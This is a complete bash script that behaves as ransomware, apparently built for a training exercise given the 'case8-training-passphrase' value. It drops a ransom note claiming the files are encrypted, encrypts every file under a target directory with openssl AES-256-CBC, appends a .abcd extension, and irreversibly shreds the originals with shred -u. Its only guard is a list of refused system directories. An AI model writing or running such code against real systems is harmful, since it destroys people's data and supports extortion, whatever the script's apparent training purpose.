#!/usr/bin/env bash
set -euo pipefail

if [[ $# -ne 1 ]]; then
  echo "Usage: $0 <target_directory>" >&2
  exit 1
fi

TARGET_DIR="$1"
EXTENSION=".abcd"
PASSPHRASE="case8-training-passphrase"
RANSOM_NOTE="README_RECOVER_FILES.txt"

if [[ ! -d "${TARGET_DIR}" ]]; then
  echo "ERROR: target directory does not exist: ${TARGET_DIR}" >&2
  exit 1
fi

TARGET_DIR="$(readlink -f "${TARGET_DIR}")"

case "${TARGET_DIR}" in
  "/"|"/bin"|"/boot"|"/dev"|"/etc"|"/lib"|"/lib64"|"/proc"|"/root"|"/run"|"/sbin"|"/sys"|"/usr"|"/var")
    echo "ERROR: refusing to operate on unsafe directory: ${TARGET_DIR}" >&2
    exit 1
    ;;
esac

if ! command -v openssl >/dev/null 2>&1; then
  echo "ERROR: openssl is not installed" >&2
  exit 1
fi

cat > "${TARGET_DIR}/${RANSOM_NOTE}" <<'EOF'
YOUR FILES ARE ENCRYPTED

All important documents, archives, databases and project files on this system have been encrypted.

Do not rename encrypted files.
Do not try to recover files with third-party tools.
Do not modify or delete files with the .abcd extension.

To restore access to your data, you need a private recovery key.
EOF

find "${TARGET_DIR}" \
  -xdev \
  -type f \
  ! -name "*${EXTENSION}" \
  ! -name "${RANSOM_NOTE}" \
  -print0 |
while IFS= read -r -d '' file; do
  encrypted_file="${file}${EXTENSION}"

  if [[ -e "${encrypted_file}" ]]; then
    continue
  fi

  openssl enc \
    -aes-256-cbc \
    -salt \
    -pbkdf2 \
    -pass "pass:${PASSPHRASE}" \
    -in "${file}" \
    -out "${encrypted_file}"

  if [[ -s "${encrypted_file}" ]]; then
    shred -u -n 1 -- "${file}"
  fi

  sleep 0.1
done
